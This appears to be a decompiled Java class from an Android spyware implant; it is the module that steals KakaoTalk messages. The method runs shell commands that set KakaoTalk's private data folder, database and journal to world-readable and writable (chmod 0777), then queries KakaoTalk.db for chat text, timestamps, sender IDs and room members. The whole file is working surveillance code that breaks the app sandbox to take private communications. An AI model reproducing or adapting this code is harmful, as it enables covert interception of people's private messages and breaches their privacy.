package com.network.android.d;

import android.content.Context;
import android.os.Handler;
import com.network.android.c.a.a;
import com.network.android.p;
import java.util.Map;
import java.util.regex.Pattern;

public final class c extends p {
    protected static final Map c;
    static final String d;
    static final Pattern e = null;

    static {
        d dVar = new d();
        c = dVar;
        d = (String) dVar.get("timestamp");
    }

    public static void a(Handler handler, Context context, boolean z) {
        try {
            a.a("getKakao GetContentIM start");
            a(handler, context, z, "kakao", "/data/data/com.kakao.talk/", "/data/data/com.kakao.talk/databases/KakaoTalk.db", "SELECT chat_logs.id, chat_logs.chat_id, chat_logs.created_at, chat_logs.message, chat_logs.user_id, chat_logs.type, c.members FROM chat_logs JOIN chat_rooms c ON chat_logs.chat_id=c.id ", "chat_logs.created_at", "chmod 0777 /data/data/com.kakao.talk; chmod 0777 /data/data/com.kakao.talk/databases; chmod 0777 /data/data/com.kakao.talk/databases/KakaoTalk.db; chmod 0777 /data/data/com.kakao.talk/databases/KakaoTalk.db-journal; ", d, c, 130);
            a.a("getKakao GetContentIM end");
        } catch (Throwable th) {
            a.a("kakaogetFacebookApp GetContentIM exception- " + th.getMessage(), th);
        }
    }
}
